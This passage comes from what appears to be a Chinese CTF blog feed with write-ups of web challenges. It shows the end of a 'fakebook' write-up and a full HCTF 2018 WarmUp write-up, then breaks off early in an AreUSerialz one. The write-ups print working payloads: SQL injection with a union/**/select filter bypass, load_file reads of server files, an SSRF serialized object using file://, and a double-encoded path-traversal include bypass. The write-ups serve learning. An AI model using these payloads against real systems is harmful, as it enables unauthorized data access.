class="line"></span><br><span class="line">    <span class="function">function <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = <span class="built_in">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">curl_setopt</span>($ch, CURLOPT_URL, $url);</span><br><span class="line">        <span class="built_in">curl_setopt</span>($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = <span class="built_in">curl_exec</span>($ch);</span><br><span class="line">        $httpCode = <span class="built_in">curl_getinfo</span>($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">curl_close</span>($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> function <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;<span class="built_in">get</span>($<span class="keyword">this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> function <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = $<span class="keyword">this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先进行页面功能分析。<br>常规注册并登录，发现登录后url存在注入点。</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">view.php?no=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span></span><br><span class="line">#成功运行</span><br><span class="line">view.php?no=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span></span><br><span class="line">#成功运行，说明此处存在sql注入点。</span><br><span class="line">view.php?no=<span class="number">1</span> order by <span class="number">5</span></span><br><span class="line">#<span class="number">4</span>的时候不报错，<span class="number">5</span>的时候报错，证明有<span class="number">4</span>个字段</span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line"><span class="meta">#no hack~应该是union被过滤了</span></span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span>select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line">#成功有回显</span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span>select <span class="number">1</span>,<span class="built_in">database</span>(),<span class="number">3</span>,<span class="number">4</span> </span><br><span class="line">#成功爆出数据库的名称fakebook</span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span>select <span class="number">1</span>,<span class="built_in">group_concat</span>(table_name),<span class="number">3</span>,<span class="number">4</span> from information_schema.tables.where table_schema=<span class="built_in">database</span>()</span><br><span class="line">#成功爆出表名为users</span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span>select <span class="number">1</span>,<span class="built_in">group_concat</span>(column_name),<span class="number">3</span>,<span class="number">4</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span></span><br><span class="line">#成功爆出字段名：no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span>select <span class="number">1</span>,<span class="built_in">group_concat</span>(data),<span class="number">3</span>,<span class="number">4</span> from users</span><br><span class="line">#成功爆出注册时的序列化账户</span><br><span class="line">#O:<span class="number">8</span>:<span class="string">&quot;UserInfo&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;tzzzez&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">20</span>;s:<span class="number">4</span>:<span class="string">&quot;blog&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;tzzzez.blog&quot;</span>;&#125;</span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span>select <span class="number">1</span>,<span class="built_in">load_file</span>(<span class="string">&#x27;/var/www/html/flag.php&#x27;</span>),<span class="number">3</span>,<span class="number">4</span></span><br><span class="line">#借助load_file函数读取flag.php网页内容</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h3><p>借助load_file函数读取结果</p><blockquote><p>view.php?no=-1 union/**/select 1,load_file(‘/var/www/html/flag.php’),3,4</p></blockquote><p>f12查看源码可以找到flag<br><img src="https://img-blog.csdnimg.cn/20210517212403125.png" alt="在这里插入图片描述"></p><h3 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h3><p>借助ssrf，通过get函数读取/flag.php内容，由于被过滤，所以无法直接读取。因此借助file协议读取网页内容。读取的payload为：</p><blockquote><p>file:///var/www/html/flag.php</p></blockquote><p>函数中的user还有一层序列化，此时可以通过sql爆破出的user的序列化进行构建，也可以通过源码进行构造。（混子表示完全看不懂…）</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> <span class="built_in">UserInfo</span>();</span><br><span class="line">$a-&gt;name = <span class="string">&#x27;tzzzez&#x27;</span>;</span><br><span class="line">$a-&gt;age=<span class="number">20</span>;</span><br><span class="line">$a-&gt;blog=<span class="string">&#x27;file:///var/www/html/flag.php&#x27;</span>;</span><br><span class="line"><span class="function">echo <span class="title">serialize</span><span class="params">($a)</span></span>;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210517212654796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后通过sql注入，返回file读取的内容</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">view.php?no=<span class="number">-1</span>%<span class="number">20u</span>nion<span class="comment">/**/</span>select%<span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>,%<span class="number">27</span>O:<span class="number">8</span>:<span class="string">&quot;UserInfo&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;tzzzez&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">20</span>;s:<span class="number">4</span>:<span class="string">&quot;blog&quot;</span>;s:<span class="number">29</span>:<span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;%<span class="number">27</span></span><br></pre></td></tr></table></figure><p>f12查看源码里找到flag<br><img src="https://img-blog.csdnimg.cn/202105172135475.png" alt="在这里插入图片描述"></p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>混子不配得到flag…</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[HCTF 2018]WarmUp(PHP 代码审计)</title>
      <link href="/posts/%5BHCTF%202018%5DWarmUp(PHP%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)/"/>
      <url>/posts/%5BHCTF%202018%5DWarmUp(PHP%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>buuctf里web的第一道题，比较怀念，依然不会写。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>打开题目，是一个滑稽图<br><img src="https://img-blog.csdnimg.cn/20210516210712121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看不出什么，查看网页源代码，发现了source.php<br><img src="https://img-blog.csdnimg.cn/20210516210901476.png" alt="在这里插入图片描述"><br>访问source.php，发现以下source.php中的代码，<br>有一说一，我也看不懂是什么意思，看别人的题解知道，这是index.php的源代码</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static <span class="keyword">function</span> checkFile(&amp;<span class="variable">$page</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! isset(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! empty(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="built_in">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>发现hint.php，看一下，提示flag在/ffffllllaaaagggg里面，咱也不知道怎么访问，就跑去看看大佬的题解<br><img src="https://img-blog.csdnimg.cn/20210516211728347.png" alt="在这里插入图片描述"><br>看大佬题解知道接下来要分析代码，咱也不会，就看看大佬的分析过程</p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="built_in">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">       &amp;&amp; <span class="built_in">is_string</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">       &amp;&amp; emmm::<span class="built_in">checkFile</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">   ) &#123;</span><br><span class="line">       include $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">       exit;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       echo <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">   &#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>整体利用的漏洞就是代码最后的include函数，利用文件包含漏洞<br>因此，最后的if条件语句是关键，即需要满足 <em><strong>if(true &amp;&amp; true &amp;&amp; true)</strong></em> ，才会执行include函数，否则输出滑稽图。<br>! empty($_REQUEST[‘file’]满足true简单<br>is_string($_REQUEST[‘file’]满足true简单<br>emmm::checkFile($_REQUEST[‘file’]满足true，需要执行emmm类中的checkFile函数，使得该函数最终返回true才可以</p><p>整体细节详解（checkFile函数的目标就是返回true）：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">   &#123;</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> function <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">       </span>&#123;</span><br><span class="line">           $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">           <span class="keyword">if</span> (! <span class="built_in">isset</span>($page) || !<span class="built_in">is_string</span>($page)) &#123;</span><br><span class="line">               echo <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (<span class="built_in">in_array</span>($page, $whitelist)) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           $_page = <span class="built_in">mb_substr</span>(</span><br><span class="line">               $page,</span><br><span class="line">               <span class="number">0</span>,</span><br><span class="line">               <span class="built_in">mb_strpos</span>($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">           );</span><br><span class="line">           <span class="keyword">if</span> (<span class="built_in">in_array</span>($_page, $whitelist)) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           $_page = <span class="built_in">urldecode</span>($page);</span><br><span class="line">           $_page = <span class="built_in">mb_substr</span>(</span><br><span class="line">               $_page,</span><br><span class="line">               <span class="number">0</span>,</span><br><span class="line">               <span class="built_in">mb_strpos</span>($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">           );</span><br><span class="line">           <span class="keyword">if</span> (<span class="built_in">in_array</span>($_page, $whitelist)) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           echo <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (! <span class="built_in">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">       &amp;&amp; <span class="built_in">is_string</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">       &amp;&amp; emmm::<span class="built_in">checkFile</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">   ) &#123;</span><br><span class="line">       include $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">       exit;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       echo <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">   &#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、定义了一个类emm</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、在类emm中定义了一个<span class="built_in">checkFile</span>()函数</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、不执行函数，先判断下面的<span class="keyword">if</span>语句：<span class="keyword">if</span> (<span class="literal">true</span> &amp;&amp; <span class="literal">true</span> &amp;&amp; <span class="literal">true</span>)才能执行include函数，所</span><br><span class="line">以需要满足如下要求：</span><br><span class="line">(<span class="number">1</span>)$_REQUEST[<span class="string">&#x27;file&#x27;</span>]不为空，!<span class="built_in">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>]才会返回<span class="literal">true</span>；</span><br><span class="line">(<span class="number">2</span>)$_REQUEST[<span class="string">&#x27;file&#x27;</span>]是字符串，<span class="built_in">is_string</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>]才会返回<span class="literal">true</span>;</span><br><span class="line">(<span class="number">3</span>)<span class="built_in">checkFile</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>]返回<span class="literal">true</span>，emmm::<span class="built_in">checkFile</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>]才</span><br><span class="line">会返回<span class="literal">true</span>；</span><br><span class="line">因此，满足这三个条件，最后才能执行include函数</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、接下来看看<span class="built_in">checkFile</span>()函数中的内容</span><br><span class="line">(<span class="number">1</span>)第一个<span class="keyword">if</span>不能<span class="keyword">return</span> flase，因为这里不能执行&#123;&#125;中的语句，因为不管<span class="keyword">return</span> <span class="literal">true</span>或者<span class="keyword">return</span> <span class="literal">false</span>，都会</span><br><span class="line">终止当前函数的执行，所以需要满足<span class="keyword">if</span> (<span class="literal">false</span> || <span class="literal">false</span>)才能继续执行下面的代码，即，$page存在并且是字符串;</span><br><span class="line">(<span class="number">2</span>)第<span class="number">2</span>个语句可以执行，返回<span class="literal">true</span></span><br><span class="line">那么，就需要$whitelist中存在$page</span><br><span class="line">注：in_array函数是检查数组中是否存在某个值(找到<span class="literal">true</span>；找不<span class="literal">false</span>),特别注意这是在数组的键值中找，不包括键</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、这样的话我们就可以构造<span class="built_in">payload</span></span><br><span class="line">(<span class="number">1</span>)测试payload1：</span><br><span class="line">http:<span class="comment">//111.198.29.45:56708/index.php?file=source.php</span></span><br><span class="line">执行了source.php，输出了里面的内容</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)测试payload2：</span><br><span class="line">http:<span class="comment">//111.198.29.45:56708/index.php?file=source.php../../../../../ffffllllaaaagggg</span></span><br><span class="line">我想得到ffffllllaaaagggg时就出问题了，因为ffffllllaaaagggg不在$whitelist数组的键值中，并且</span><br><span class="line">继续执行代码后，下面$_page=source.php../../../../../../../ffffllllaaaagggg，第<span class="number">3</span>个<span class="keyword">if</span>语句<span class="literal">false</span>，</span><br><span class="line">urldecode后$_page=source.php../../../../../../../ffffllllaaaagggg，mb_substr后还是这个，第<span class="number">4</span></span><br><span class="line">个<span class="keyword">if</span>语句还是<span class="literal">false</span>，最后输出you can<span class="number">&#x27;</span>t see it，还<span class="keyword">return</span> <span class="literal">false</span>，这还玩啥</span><br><span class="line"></span><br><span class="line">该如何解决？我需要include ffffllllaaaagggg文件，而且需要使用../，怎样绕过？</span><br><span class="line">注意到<span class="built_in">mb_strpos</span>($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)没，我们构造一个?即可</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)测试payload3：</span><br><span class="line">http:<span class="comment">//111.198.29.45:56708/index.php?file=source.php?../../../../../../ffffllllaaaagggg</span></span><br><span class="line">构造?的话，第<span class="number">2</span>个<span class="keyword">if</span>语句就不能返回<span class="literal">true</span>了，第<span class="number">3</span>个<span class="keyword">if</span>语句一样，也不能执行<span class="keyword">return</span>语句，第<span class="number">4</span>个<span class="keyword">if</span>语句需要满足<span class="keyword">if</span></span><br><span class="line">(<span class="literal">true</span>)，因为需要执行&#123;&#125;中的内容，最后使得<span class="built_in">checkFile</span>()函数返回的布尔类型为<span class="built_in"><span class="literal">true</span></span></span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>)payload3执行流程：此时file=source.php?../../../../../../ffffllllaaaagggg</span><br><span class="line">第<span class="number">1</span>个<span class="keyword">if</span>返回<span class="literal">false</span></span><br><span class="line">第<span class="number">2</span>个<span class="keyword">if</span>返回<span class="literal">false</span></span><br><span class="line">$_page=source.php</span><br><span class="line">第<span class="number">3</span>个<span class="keyword">if</span>返回<span class="literal">true</span>，退出checkFile函数，此时核心代码中已满足<span class="keyword">if</span>(<span class="literal">true</span>&amp;&amp;<span class="literal">true</span>&amp;&amp;<span class="literal">true</span>)，即执行include函数</span><br><span class="line">最后<span class="built_in">include</span>(source.php?../../../../../../ffffllllaaaagggg)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析得到payload如下</p><blockquote><p><a href="http://xxx/index.php?file=source.php%253f../../../../../ffffllllaaaagggg">http://xxx/index.php?file=source.php%253f../../../../../ffffllllaaaagggg</a></p></blockquote><p>访问即可得到flag。</p><p>执行流程：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">第<span class="number">1</span>个<span class="keyword">if</span>返回<span class="literal">false</span></span><br><span class="line">第<span class="number">2</span>个<span class="keyword">if</span>返回<span class="literal">false</span></span><br><span class="line">$_page=source.php%<span class="number">3f</span>../../../../../ffffllllaaaagggg</span><br><span class="line">第<span class="number">3</span>个<span class="keyword">if</span>返回<span class="literal">false</span></span><br><span class="line">urldecode执行后，$_page=source.php?../../../../../ffffllllaaaagggg</span><br><span class="line">执行mb_substr后$_page=source.php</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">下面核心代码执行同理</span><br><span class="line">最后<span class="built_in">include</span>(source.php%<span class="number">253f</span>../../../../../ffffllllaaaagggg)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>（1）只要函数中return执行了，就会立即结束函数的执行，继续执行函数外的代码；<br>（2）||表示任意||两边只要有一边是true，整体就返回true；<br>（3）in_array函数是检查数组中是否存在某个值(找到true；找不false),特别注意这是在数组的键值中找，不包括键；<br>（4）mb_strpos查找目标首次出现的位置，从0开始；<br>（5）mb_substr返回字符串，特别注意的是：mb_strpos获取的数字，在mb_substr不是从0开始，而是代表返回的长度。</p><h2 id="最后说一句"><a href="#最后说一句" class="headerlink" title="最后说一句"></a>最后说一句</h2><p>其实看了题解也没太看懂，存着，有空多看看，总有一天会看懂的。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[网鼎杯 2020 青龙组]AreUSerialz</title>
      <link href="/posts/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5DAreUSerialz(PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)/"/>
      <url>/posts/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5DAreUSerialz(PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>真的不会写</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>进入链接，一大串代码来袭</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&lt;?<span class="function">php</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">include</span><span class="params">(<span class="string">&quot;flag.php&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">highlight_file</span>(__FILE__);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $filename = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        $content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;<span class="built_in">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> function <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;<span class="built_in">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = $<span class="keyword">this</span>-&gt;<span class="built_in">read</span>();</span><br><span class="line">            $<span class="keyword">this</span>-&gt;<span class="built_in">output</span>($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;<span class="built_in">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> function <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isset</span>($<span class="keyword">this</span>-&gt;filename) &amp;&amp; <span class="built_in">isset</span>($<span class="keyword">this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strlen</span>((string)$<span class="keyword">this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                $<span class="keyword">this</span>-&gt;<span class="built_in">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="built_in">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = <span class="built_in">file_put_contents</span>($<span class="keyword">this</span>-&gt;filename, $<span class="keyword">this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) $<span class="keyword">this</span>-&gt;<span class="built_in">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> $<span class="keyword">this</span>-&gt;<span class="built_in">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;<span class="built_in">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> function <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span 